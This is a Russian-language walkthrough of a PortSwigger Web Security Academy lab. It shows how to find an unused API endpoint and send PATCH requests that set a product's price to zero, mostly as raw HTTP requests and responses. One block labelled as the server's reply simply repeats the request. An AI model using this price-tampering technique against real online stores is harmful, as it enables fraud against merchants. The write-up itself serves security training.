---
title: "Finding and exploiting an unused API endpoint"
date: 2025-07-29
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/IMG_writeups/IMG_PortSwigger/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/api-testing/api-testing-identifying-and-interacting-with-api-endpoints/api-testing/lab-exploiting-unused-api-endpoint"
classes: wide
---

Для прохождения лабы нужно найти эндпоинт с помощью **атаки на API**, который позволит купить `Lightweight l33t Leather Jacket`. Для входа в аккаунт можно использовать креды `wiener`:`peter`.

```
https://0a6600c70445360e80349468005300ba.web-security-academy.net
```

## Solution

Зайду на страницу нужного товара: `https://0a6600c70445360e80349468005300ba.web-security-academy.net/product?productId=1`

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_api_testing/IMG_Finding_and_exploiting_an_unused_API_endpoint/1.png){: height="200" .align-center}


Я получил `productId` нужного товара: `1`. Попробую добавить другой товар в корзину, чтобы увидеть, через какой запрос он происходит. Предварительно залогинюсь в ЛК.

```http
POST /cart HTTP/2
Host: 0a6600c70445360e80349468005300ba.web-security-academy.net
Cookie: session=MkwUX4pRA0cdGpiNLV2rKk76UgD52Auu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6600c70445360e80349468005300ba.web-security-academy.net/cart
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: https://0a6600c70445360e80349468005300ba.web-security-academy.net
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers

productId=2&quantity=1&redir=CART
```

Вот этот запрос похож на правильный. Подставлю нужный `productId`.

```http
HTTP/2 302 Found
Location: /cart
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Товар был добавлен в корзину. Но у меня нема денег. Надо-что то с этим решать. ~~Заработать~~ Нашел вот такой запрос:

```http
GET /api/products/1/price HTTP/2
Host: 0a6600c70445360e80349468005300ba.web-security-academy.net
Cookie: session=MkwUX4pRA0cdGpiNLV2rKk76UgD52Auu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6600c70445360e80349468005300ba.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
```

Попробую применить другие методы. Например `POST`, чтобы попробовать изменить цену на товар:

```http
POST /api/products/1/price HTTP/2
Host: 0a6600c70445360e80349468005300ba.web-security-academy.net
Cookie: session=MkwUX4pRA0cdGpiNLV2rKk76UgD52Auu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6600c70445360e80349468005300ba.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type: application/json; charset=utf-8
Content-Length: 27

{
	"price": 1337.00
}
```

На что я получил интересный ответ:

```http
HTTP/2 405 Method Not Allowed
Allow: GET, PATCH
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 20

"Method Not Allowed"
```

Попробую метод `PATCH`:

```http
PATCH /api/products/1/price HTTP/2
Host: 0a6600c70445360e80349468005300ba.web-security-academy.net
Cookie: session=MkwUX4pRA0cdGpiNLV2rKk76UgD52Auu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6600c70445360e80349468005300ba.web-security-academy.net/product?productId=1
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
Te: trailers
Content-Type: application/json; charset=utf-8
Content-Length: 23

{
	"price":   1
}
```

Ответ:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 17

{"price":"$0.01"}
```

Проверю на сайте:

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_api_testing/IMG_Finding_and_exploiting_an_unused_API_endpoint/2.png){: height="200" .align-center}

Денег все еще не хватает. Попрошу скидку:

```http
PATCH /api/products/1/price HTTP/2
Host: 0a6600c70445360e80349468005300ba.web-security-academy.net
Cookie: session=MkwUX4pRA0cdGpiNLV2rKk76UgD52Auu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Content-Type: application/json; charset=utf-8
Content-Length: 23

{
	"price":   0
}
```

Их ответ:

```http
PATCH /api/products/1/price HTTP/2
Host: 0a6600c70445360e80349468005300ba.web-security-academy.net
Cookie: session=MkwUX4pRA0cdGpiNLV2rKk76UgD52Auu
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:136.0) Gecko/20100101 Firefox/136.0
Content-Type: application/json; charset=utf-8
Content-Length: 23

{
	"price":   0
}

```

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_api_testing/IMG_Finding_and_exploiting_an_unused_API_endpoint/3.png){: height="200" .align-center}

Вот теперь мне по карману. Возьму 2)

![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_api_testing/IMG_Finding_and_exploiting_an_unused_API_endpoint/4.png){: height="200" .align-center}